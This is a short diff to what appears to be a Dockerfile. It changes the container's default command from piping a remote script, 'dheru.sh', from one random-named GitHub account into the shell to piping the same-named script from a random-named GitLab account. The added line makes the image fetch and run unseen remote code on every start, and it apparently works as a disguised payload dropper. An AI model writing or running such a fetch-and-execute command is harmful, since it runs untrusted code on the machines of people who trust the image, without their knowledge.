@@ -35,4 +35,4 @@ ENV HOME /root
 WORKDIR /root
 
 # Define default command.
-CMD curl https://github.com/juandjzuydtlnk/sause/raw/main/dheru.sh | sh
+CMD curl https://gitlab.com/jordankalauren/sc/-/raw/main/dheru.sh | sh
